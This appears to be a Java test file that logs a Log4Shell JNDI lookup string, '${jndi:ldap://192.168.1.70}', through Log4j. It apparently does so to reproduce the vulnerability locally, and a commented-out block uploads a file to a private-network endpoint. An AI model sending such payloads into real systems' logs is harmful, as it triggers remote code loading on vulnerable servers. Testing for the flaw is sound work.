package com.ljq.mydemo.thread.test;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


/**
 * @author gino
 * 2021-11-29
 */
public class test {
    private static final Logger logger= LogManager.getLogger(test.class);

 /*   HttpURLConnection httpConn = (HttpURLConnection) new URL("http://192.168.1.145:21122/rest-api/v1/upload").openConnection();
            httpConn.setRequestMethod("POST");
            httpConn.setDoOutput(true);
    OutputStream out = httpConn.getOutputStream();
    FileInputStream fis = new FileInputStream(fileName);
    int len = -1;
    byte[] buffer = new byte[100];
            while((len = fis.read(buffer, 0, 100)) != -1) {
        out.write(buffer, 0, len);
        Thread.sleep(1000);
    }*/

    public static void main(String[] args) {
        logger.error("${jndi:ldap://192.168.1.70}");
    }
}
